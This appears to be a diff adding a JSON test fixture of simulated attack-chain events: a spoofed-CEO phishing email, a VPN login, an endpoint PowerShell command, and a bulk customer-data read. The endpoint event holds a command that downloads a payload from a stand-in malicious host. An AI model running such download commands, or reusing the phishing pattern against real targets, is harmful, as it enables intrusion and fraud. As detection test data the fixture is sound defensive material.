@@ -1,0 +1,42 @@
+{
+  "events": [
+    {
+      "type": "email",
+      "payload": {
+        "from": "ceo@paypa¶2.com",
+        "to": "finance@example.com",
+        "subject": "Urgent wire transfer needed",
+        "raw": {"body":"Please complete payment: https://bit.ly/xyz"}
+      }
+    },
+    {
+      "type": "remote_access",
+      "payload": {
+        "src_ip": "198.51.100.23",
+        "user": "finance",
+        "dest_host": "vpn.corp.example.com",
+        "protocol": "vpn",
+        "timestamp": "2025-11-04T10:00:00Z"
+      }
+    },
+    {
+      "type": "endpoint",
+      "payload": {
+        "host": "host-123",
+        "process": "powershell.exe",
+        "command": "Invoke-WebRequest -Uri https://mal.example/payload -OutFile payload.exe",
+        "user": "finance"
+      }
+    },
+    {
+      "type": "data_access",
+      "payload": {
+        "user": "finance",
+        "database": "payments",
+        "table": "customers",
+        "record_count": 12000,
+        "timestamp": "2025-11-04T10:05:00Z"
+      }
+    }
+  ]
+}
